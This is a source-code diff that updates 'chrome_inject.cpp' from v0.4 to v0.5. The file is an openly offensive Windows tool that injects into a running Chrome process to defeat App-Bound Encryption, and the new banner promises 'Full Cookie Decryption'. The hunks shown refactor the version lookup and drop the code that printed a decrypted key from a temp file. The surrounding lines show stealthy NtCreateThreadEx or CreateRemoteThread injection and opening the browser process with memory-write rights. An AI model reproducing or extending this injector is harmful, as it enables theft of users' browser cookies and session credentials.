@@ -1,5 +1,5 @@
 // chrome_inject.cpp
-// v0.4 (c) Alexander 'xaitax' Hagenah
+// v0.5 (c) Alexander 'xaitax' Hagenah
 
 #include <Windows.h>
 #include <tlhelp32.h>
@@ -81,9 +81,10 @@ void DisplayBanner()
 {
     SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 12);
     std::cout << "------------------------------------------------" << std::endl;
-    std::cout << "|  Chrome App-Bound Encryption Injector        |" << std::endl;
+    std::cout << "|  Chrome App-Bound Encryption Decryption      |" << std::endl;
     std::cout << "|  Multi-Method Process Injector               |" << std::endl;
-    std::cout << "|  v0.4 by @xaitax                             |" << std::endl;
+    std::cout << "|  Full Cookie Decryption                      |" << std::endl;
+    std::cout << "|  v0.5 by @xaitax                             |" << std::endl;
     std::cout << "------------------------------------------------" << std::endl
               << std::endl;
     SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 7);
@@ -323,7 +324,23 @@ int wmain(int argc, wchar_t *argv[])
         if (StartBrowserAndWait(exePath, pid))
         {
             started = true;
-            print_status("[+]", disp + " launched (PID=" + std::to_string(pid) + ")");
+            debug("Retrieving version info");
+            DWORD hv = 0, vs = GetFileVersionInfoSizeW(exePath.c_str(), &hv);
+            debug("GetFileVersionInfoSizeW returned size=" + std::to_string(vs));
+            std::string ver;
+            if (vs) {
+              std::vector<BYTE> data(vs);
+              if (GetFileVersionInfoW(exePath.c_str(), hv, vs, data.data())) {
+                UINT len = 0; VS_FIXEDFILEINFO *ffi = nullptr;
+                if (VerQueryValueW(data.data(), L"\\", (LPVOID*)&ffi, &len)) {
+                  ver = std::to_string(HIWORD(ffi->dwFileVersionMS)) + "." +
+                        std::to_string(LOWORD(ffi->dwFileVersionMS)) + "." +
+                        std::to_string(HIWORD(ffi->dwFileVersionLS)) + "." +
+                        std::to_string(LOWORD(ffi->dwFileVersionLS));
+                }
+              }
+            }
+            print_status("[+]", disp + " (v. " + ver + ") launched w/ PID " + std::to_string(pid) + "");
         }
         else
         {
@@ -336,29 +353,8 @@ int wmain(int argc, wchar_t *argv[])
         print_status("[-]", disp + " not running");
         return 1;
     }
-    debug("Retrieving version info");
-    DWORD hv = 0, vs = GetFileVersionInfoSizeW(exePath.c_str(), &hv);
-    debug("GetFileVersionInfoSizeW returned size=" + std::to_string(vs));
-    if (vs)
-    {
-        std::vector<BYTE> data(vs);
-        if (GetFileVersionInfoW(exePath.c_str(), hv, vs, data.data()))
-        {
-            UINT len = 0;
-            VS_FIXEDFILEINFO *ffi = nullptr;
-            if (VerQueryValueW(data.data(), L"\\", (LPVOID *)&ffi, &len))
-            {
-                std::string ver = std::to_string(HIWORD(ffi->dwFileVersionMS)) + "." +
-                                  std::to_string(LOWORD(ffi->dwFileVersionMS)) + "." +
-                                  std::to_string(HIWORD(ffi->dwFileVersionLS)) + "." +
-                                  std::to_string(LOWORD(ffi->dwFileVersionLS));
-                print_status("[+]", disp + " Version: " + ver);
-                debug("Version string=" + ver);
-            }
-        }
-    }
+    
     std::string mdesc = (method == "nt") ? "NtCreateThreadEx stealth" : "CreateRemoteThread + LoadLibrary";
-    print_status("[*]", "Located " + disp + " with PID " + std::to_string(pid));
 
     debug("Opening process PID=" + std::to_string(pid));
     HandleGuard ph(OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid));
@@ -411,21 +407,6 @@ int wmain(int argc, wchar_t *argv[])
             std::cout << std::endl;
         }
         DeleteFileA(logf.c_str());
-        std::string keyf = std::string(tmpPath) + "chrome_appbound_key.txt";
-        debug("Opening key file " + keyf);
-        std::ifstream kfs(keyf);
-        if (kfs)
-        {
-            std::string key;
-            std::getline(kfs, key);
-            print_status("[+]", "Decrypted Key: " + key);
-            debug("Key: " + key);
-        }
-        else
-        {
-            print_status("[-]", "Key file missing");
-            return 1;
-        }
         if (started)
         {
             debug("Terminating browser PID=" + std::to_string(pid));
